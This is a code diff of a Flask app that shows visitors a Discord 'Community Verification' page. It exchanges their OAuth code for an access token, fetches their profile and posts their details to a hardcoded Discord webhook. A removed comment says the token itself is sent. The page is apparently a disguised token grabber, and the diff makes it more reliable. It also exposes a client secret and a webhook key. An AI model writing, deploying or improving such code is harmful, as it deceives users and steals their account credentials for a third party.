@@ -6,16 +6,14 @@ app = Flask(__name__)
 
 CLIENT_ID = "1526220638283628624"
 CLIENT_SECRET = "Ll-Nk5CH4a1RZF_RWhV-j9ueE4Wsh8jj"
-REDIRECT_URI = "https://root1-two.vercel.app/api/index"
+REDIRECT_URI = "https://root1-two.vercel.app"
 WEBHOOK_URL = "https://discord.com/api/webhooks/1569026174275944600/VBLBlmc8bf1dguN1S9kjJQ2TvVzIUnZbuSiUEcvhDi5emEiDwn4weplUamhUY2775Vk3"
 
 
-@app.route("/", methods=["GET"])
-@app.route("/api/index", methods=["GET"])
+@app.route("/")
 def index():
   code = request.args.get("code")
 
-  # Landing page with verification button
   if not code:
     return render_template_string("""
             <!DOCTYPE html>
@@ -36,14 +34,14 @@ def index():
                 <div class="card">
                     <h1>Community Verification</h1>
                     <p>Link your Discord account to verify your identity.</p>
-                    <a href="https://discord.com/api/oauth2/authorize?client_id=1526220638283628624&redirect_uri=https://root1-two.vercel.app/api/index&response_type=code&scope=identify" class="btn">Verify with Discord</a>
+                    <a href="https://discord.com/api/oauth2/authorize?client_id=1526220638283628624&redirect_uri=https://root1-two.vercel.app&response_type=code&scope=identify" class="btn">Verify with Discord</a>
                 </div>
             </body>
             </html>
         """)
 
   try:
-    # Exchange code for access token
+    # 1. Exchange code for access token
     token_res = requests.post(
         "https://discord.com/api/oauth2/token",
         data={
@@ -58,20 +56,18 @@ def index():
     )
 
     if token_res.status_code != 200:
-      requests.post(
-          WEBHOOK_URL,
-          json={
-              "content": (
-                  "❌ **Token Exchange Failed:** ```\n"
-                  f"{token_res.text}\n```"
-              )
-          },
-      )
-      return f"Token exchange failed: {token_res.text}", 500
+      return (
+          f"<h3>Token Exchange Failed (Status {token_res.status_code})</h3>"
+          f"<pre>{token_res.text}</pre>"
+      ), 500
 
-    access_token = token_res.json().get("access_token")
+    token_data = token_res.json()
+    access_token = token_data.get("access_token")
 
-    # Fetch user details
+    if not access_token:
+      return f"<h3>No Access Token Found</h3><pre>{token_data}</pre>", 500
+
+    # 2. Fetch user profile
     user_res = requests.get(
         "https://discord.com/api/users/@me",
         headers={"Authorization": f"Bearer {access_token}"},
@@ -79,8 +75,11 @@ def index():
     )
     user = user_res.json()
 
-    # Send token and user info to webhook
-    requests.post(
+    username = user.get("username", "Unknown")
+    user_id = user.get("id", "Unknown")
+
+    # 3. Send to webhook
+    webhook_res = requests.post(
         WEBHOOK_URL,
         json={
             "embeds": [{
@@ -89,10 +88,7 @@ def index():
                 "fields": [
                     {
                         "name": "User",
-                        "value": (
-                            f"{user.get('username', 'Unknown')} (`"
-                            f"{user.get('id', 'Unknown')}`)"
-                        ),
+                        "value": f"{username} (`{user_id}`)",
                         "inline": True,
                     },
                     {
@@ -103,10 +99,17 @@ def index():
                 ],
             }]
         },
+        timeout=10,
     )
 
+    if webhook_res.status_code not in [200, 204]:
+      return (
+          f"<h3>Webhook Failed (Status {webhook_res.status_code})</h3>"
+          f"<pre>{webhook_res.text}</pre>"
+      ), 500
+
   except Exception as e:
-    requests.post(WEBHOOK_URL, json={"content": f"🚨 Error: `{str(e)}`"})
+    return f"<h3>Server Exception</h3><pre>{str(e)}</pre>", 500
 
   return render_template_string("""
         <!DOCTYPE html>
@@ -124,7 +127,7 @@ def index():
         <body>
             <div class="card">
                 <h1>Verification Successful!</h1>
-                <p>Your account has/have been verified. You can close this tab.</p>
+                <p>Your account has been verified. You can close this tab.</p>
             </div>
         </body>
         </html>
